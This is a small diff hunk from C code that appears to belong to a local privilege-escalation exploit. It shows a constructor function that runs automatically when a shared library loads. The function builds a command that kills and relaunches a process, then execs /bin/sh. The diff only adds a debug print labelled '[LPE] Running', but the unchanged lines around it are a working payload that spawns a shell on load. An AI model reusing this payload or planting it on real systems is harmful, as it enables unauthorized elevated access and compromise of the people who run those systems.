@@ -20,7 +20,7 @@ void __attribute__((constructor)) setup() {
   char p[4096] = {0};
 
   sprintf(p, "\"kill `pidof %s`; %s\"", buf, buf);
-
+  printf("[LPE] Running: %s\n", buf);
   // exec
   char *empty[] = {"-c", p};
   execve("/bin/sh", empty, empty);
